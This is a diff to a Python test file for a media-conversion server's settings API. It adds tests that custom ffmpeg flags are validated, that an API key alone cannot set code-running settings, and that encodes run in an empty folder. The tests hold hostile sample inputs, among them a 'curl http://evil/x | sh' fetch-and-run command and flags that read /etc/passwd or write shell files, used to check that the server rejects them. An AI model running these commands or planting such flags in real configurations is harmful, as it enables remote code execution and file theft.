@@ -9,10 +9,14 @@ Output naming: target_resolution and filename_suffix were put into the output
 filename unchecked, so "x/../../tmp/y" moved the output out of the folder.
 """
 import json
+import shutil
+import subprocess
 from pathlib import Path
+from types import SimpleNamespace
 
 import aiosqlite
 import pytest
+import pytest_asyncio
 
 from backend.converter import (
     build_disc_output_filename,
@@ -43,6 +47,12 @@ def test_ordinary_flags_are_accepted(flags):
     "-tune grain extra.mkv",
     "-an evil.sh",                          # -an takes no value: an output file
     "-an file:evil.mkv",
+    "-an data/out.mkv",                     # relative to ffmpeg's working folder
+    "-an out+.mkv",
+    "-vn out%d.png",
+    "-an .mkv",
+    "-sdp_file a.sdp",
+    "-stats_enc_post enc.log",
     "-y -i /etc/passwd",
     "-vf movie=/etc/passwd",
     "-x265-params csv=/tmp/x.csv",
@@ -141,15 +151,19 @@ async def test_custom_flags_need_password_auth(route, test_db):
     assert await _get(test_db, "custom_ffmpeg_flags") in (None, "")
 
 
+# What api_key_auth records for a request signed in with the UI password.
+PASSWORD_SESSION = SimpleNamespace(state=SimpleNamespace(auth_method="session"))
+
+
 @pytest.mark.asyncio
 async def test_custom_flags_are_validated_when_auth_is_on(route, test_db):
     from backend.models import SettingsUpdate
     await _set(test_db, "auth_enabled", "true")
     with pytest.raises(Exception) as exc:
         await route.update_encoding_settings(
-            SettingsUpdate(custom_ffmpeg_flags="-f rawvideo /app/data/hook.sh"))
+            SettingsUpdate(custom_ffmpeg_flags="-f rawvideo /app/data/hook.sh"), PASSWORD_SESSION)
     assert getattr(exc.value, "code", None) == "settings.customFlagsInvalid"
-    await route.update_encoding_settings(SettingsUpdate(custom_ffmpeg_flags="-tune grain"))
+    await route.update_encoding_settings(SettingsUpdate(custom_ffmpeg_flags="-tune grain"), PASSWORD_SESSION)
     assert await _get(test_db, "custom_ffmpeg_flags") == "-tune grain"
 
 
@@ -231,3 +245,67 @@ async def test_export_import_round_trip(route, test_db):
     assert json.loads(await _get(test_db, "always_keep_languages")) == ["eng", "ice"]
     assert await _get(test_db, "rename_movie_file_pattern") == "{title} ({year})"
     assert json.loads(await _get(test_db, "run_hours")) == {"enabled": True, "hours": [1, 2]}
+
+
+# --- through the real auth middleware --------------------------------------
+
+@pytest_asyncio.fixture
+async def client(route, test_db, monkeypatch):
+    from httpx import AsyncClient, ASGITransport
+    from backend import main as main_module
+    import backend.database as db_module
+    monkeypatch.setattr(db_module, "DB_PATH", test_db)
+    monkeypatch.setattr(main_module, "DB_PATH", test_db)
+    monkeypatch.setitem(main_module._auth_cache, "checked_at", 0)
+    await _set(test_db, "auth_enabled", "true")
+    await _set(test_db, "auth_username", "admin")
+    await _set(test_db, "auth_password_hash", main_module._hash_password("correct horse"))
+    await _set(test_db, "session_secret", "s" * 64)
+    await _set(test_db, "api_key", "INTEGRATION-KEY")
+    async with AsyncClient(transport=ASGITransport(app=main_module.app), base_url="http://test") as ac:
+        yield ac
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("key,value", [
+    ("post_conversion_script", "curl http://evil/x | sh"),
+    ("custom_ffmpeg_flags", "-tune grain"),
+])
+async def test_the_api_key_alone_cannot_set_code_running_settings(client, test_db, key, value):
+    """The API key is baked into the NZBGet/SABnzbd scripts Shrinkerr
+    generates; it must not be enough to make the server run commands."""
+    r = await client.put("/api/settings/encoding", headers={"X-Api-Key": "INTEGRATION-KEY"}, json={key: value})
+    assert r.status_code == 403 and r.json()["code"] == "settings.needsPasswordLogin"
+    assert await _get(test_db, key) in (None, "")
+
+    r = await client.post("/api/auth/login", json={"username": "admin", "password": "correct horse"})
+    assert r.status_code == 200
+    r = await client.put("/api/settings/encoding", json={key: value})
+    assert r.status_code == 200, r.text
+    assert await _get(test_db, key) == value
+
+
+def _has_libx265() -> bool:
+    if not shutil.which("ffmpeg"):
+        return False
+    out = subprocess.run(["ffmpeg", "-hide_banner", "-encoders"], capture_output=True, text=True).stdout
+    return "libx265" in out
+
+
+@pytest.mark.asyncio
+@pytest.mark.skipif(not _has_libx265(), reason="needs ffmpeg with libx265")
+async def test_encode_runs_in_an_empty_folder(test_db, tmp_path, monkeypatch):
+    """A relative file name in the flags (here x265's csv=) must not land in
+    the server's working folder."""
+    workdir = tmp_path / "app"
+    workdir.mkdir()
+    monkeypatch.chdir(workdir)
+    src = tmp_path / "Show - S01E01 - 1080p WEB h264.mkv"
+    subprocess.run(["ffmpeg", "-v", "error", "-f", "lavfi", "-i", "testsrc2=size=320x240:rate=25:duration=2",
+                    "-c:v", "libx264", "-preset", "ultrafast", str(src)], check=True)
+    result = await convert_file(
+        str(src), "libx265", 2.0, override_libx265_preset="ultrafast",
+        pre_settings={"custom_ffmpeg_flags": "-x265-params csv=x265.csv"},
+    )
+    assert result["success"], result.get("error")
+    assert list(workdir.iterdir()) == []
